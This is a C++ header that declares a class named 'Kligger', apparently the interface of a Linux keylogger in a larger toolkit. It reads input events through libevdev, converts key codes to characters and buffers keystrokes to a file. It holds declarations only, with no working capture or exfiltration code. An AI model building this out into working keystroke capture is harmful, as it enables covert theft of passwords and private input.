#include <ctime>
#include <iostream>
#include <string.h>
#include <map>
#include <stdio.h>
#include <unordered_set>
#include <libevdev/libevdev.h>
#include <libevdev/libevdev-uinput.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <stdlib.h>
#include <ctime>
#include <stdbool.h>
#include "Contraption.h"

#pragma once


#define FILE_SIZE (4096)


// COMPILATION FLAG NEEDED: -ltins
// USAGE EXAMPLE: g++ -o Sniffer Sniffer.cpp -ltins

class Kligger : public Contraption
{
private:
//to make shore it cant be run twiise??
    int i;
    char buffer[FILE_SIZE];
    int index_buffer;
    int continue_to_run;

    time_t startTime;
    time_t tlimit;

    int writeFile();
    //void runTime(KilgParams kilgParams, int t);
    time_t lastkeytime;
    int keystrock(int argc, char * argv[]);
    void keyadd(int keyCode, time_t now, bool isShiftPressed, bool isCapsLockOn);
    char keyCodeToChar(int keyCode, bool isShiftPressed, bool isCapsLockOn);

public:
    Kligger(/* args */);
    ~Kligger();

    int halt() override;
    void run(const ContParams kilgParams) override;
};